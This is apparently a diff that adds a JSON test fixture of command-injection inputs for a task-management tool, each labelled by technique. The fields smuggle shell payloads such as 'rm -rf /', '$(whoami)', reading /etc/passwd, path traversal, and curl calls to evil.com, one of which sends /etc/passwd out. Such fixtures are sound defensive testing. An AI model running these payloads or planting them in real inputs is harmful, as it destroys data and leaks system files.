@@ -1,0 +1,101 @@
+[
+  {
+    "_comment": "Classic shell command injection via description",
+    "description": "Fix bug\"; rm -rf / #",
+    "project": "test",
+    "scope": "personal",
+    "area": "dev",
+    "phase": "impl"
+  },
+  {
+    "_comment": "Backtick command substitution in description",
+    "description": "Update `$(whoami)` user profile",
+    "project": "test",
+    "scope": "personal",
+    "area": "dev",
+    "phase": "impl"
+  },
+  {
+    "_comment": "Pipe injection in tag",
+    "description": "Normal task",
+    "project": "test",
+    "tags": ["valid", "| cat /etc/passwd"],
+    "scope": "personal",
+    "area": "dev",
+    "phase": "impl"
+  },
+  {
+    "_comment": "Semicolon injection in project name",
+    "description": "Normal task",
+    "project": "test; rm -rf /home",
+    "scope": "personal",
+    "area": "dev",
+    "phase": "impl"
+  },
+  {
+    "_comment": "Newline injection to break command",
+    "description": "Fix bug\n; echo PWNED > /tmp/pwned",
+    "project": "test",
+    "scope": "personal",
+    "area": "dev",
+    "phase": "impl"
+  },
+  {
+    "_comment": "Environment variable expansion in description",
+    "description": "Deploy to $HOME/.ssh/authorized_keys",
+    "project": "test",
+    "scope": "personal",
+    "area": "dev",
+    "phase": "impl"
+  },
+  {
+    "_comment": "Subshell execution in annotation",
+    "description": "Normal task",
+    "project": "test",
+    "scope": "personal",
+    "area": "dev",
+    "phase": "impl",
+    "annotations": [{"description": "$(curl http://evil.com/exfil?data=$(cat /etc/passwd))"}]
+  },
+  {
+    "_comment": "Glob pattern injection in project",
+    "description": "Normal task",
+    "project": "../../etc/passwd",
+    "scope": "personal",
+    "area": "dev",
+    "phase": "impl"
+  },
+  {
+    "_comment": "Null byte injection in description",
+    "description": "Normal task\u0000; rm -rf /",
+    "project": "test",
+    "scope": "personal",
+    "area": "dev",
+    "phase": "impl"
+  },
+  {
+    "_comment": "Escaped quote bypass in UDA value",
+    "description": "Normal task",
+    "project": "test",
+    "scope": "personal",
+    "area": "dev",
+    "phase": "impl",
+    "hypothesis": "test\\\" && curl http://evil.com"
+  },
+  {
+    "_comment": "Double-encoded shell metacharacters",
+    "description": "Normal task %26%26 rm -rf /",
+    "project": "test",
+    "scope": "personal",
+    "area": "dev",
+    "phase": "impl"
+  },
+  {
+    "_comment": "Taskwarrior filter injection via UUID-like field",
+    "description": "Normal task",
+    "project": "test +PENDING or +COMPLETED",
+    "scope": "personal",
+    "area": "dev",
+    "phase": "impl"
+  }
+]
